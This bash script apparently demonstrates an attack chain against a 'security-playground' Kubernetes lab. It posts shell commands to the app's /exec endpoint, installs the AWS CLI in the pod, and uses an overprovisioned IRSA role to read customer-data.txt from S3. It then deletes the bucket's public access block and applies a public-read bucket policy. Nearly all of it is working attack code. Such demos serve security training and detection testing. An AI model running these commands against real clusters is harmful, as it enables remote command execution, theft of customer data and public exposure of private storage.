#!/usr/bin/env bash
# Script to demonstrate how to interact with security-playground

NODE_IP=$(kubectl get nodes -o wide | awk 'FNR == 2 {print $6}')
NODE_PORT=30000

echo "1. Installing the AWS CLI"
echo "--------------------------------------------------------------------------------"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=curl --connect-timeout 5 https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o awscliv2.zip"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=unzip awscliv2.zip"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=./aws/install"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=/usr/local/bin/aws --version"
echo "2. Looking at the sensitive data/files in the bucket with security-playground's access to the AWS API via IRSA"
echo "--------------------------------------------------------------------------------"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=aws s3 cp s3://$S3_BUCKET_NAME/customer-data.txt ."
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=cat customer-data.txt"
echo "3. Removing the Public Access Block on our bucket $S3_BUCKET_NAME with the overprovisioned IRSA access"
echo "--------------------------------------------------------------------------------"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=aws s3api delete-public-access-block --bucket $S3_BUCKET_NAME"
echo "4. Finally setting a bucket policy on the bucket to make it, and all its contents, public!"
echo "--------------------------------------------------------------------------------"
POLICY="{\"Statement\":[{\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::$S3_BUCKET_NAME/*\"}]}"
POLICY_COMMAND="command=aws s3api put-bucket-policy --bucket $S3_BUCKET_NAME --policy '"$POLICY"'"
curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "$POLICY_COMMAND"
